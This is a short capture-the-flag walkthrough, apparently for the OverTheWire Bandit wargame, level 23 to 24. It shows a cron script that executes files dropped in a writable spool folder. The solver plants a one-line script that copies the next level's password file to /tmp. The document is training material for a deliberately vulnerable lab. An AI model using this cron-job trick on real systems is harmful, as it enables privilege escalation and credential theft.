# Level 23 → Level 24

```bash
bandit23@bandit:~$ cd /etc/cron.d/

bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24

bandit23@bandit:/etc/cron.d$ /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
if [ "$i" != "." -a "$i" != ".." ];
then
echo "Handling $i"
owner="$(stat --format "%U" ./$i)"
if [ "${owner}" = "bandit23" ]; then
timeout -s 9 60 ./$i
fi
rm -f ./$i
fi
done
```

```bash
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo

bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/lafnblbf24.txt" > lafnblbf24.sh

bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 lafnblbf24.sh

bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/lafnblbf24.txt
```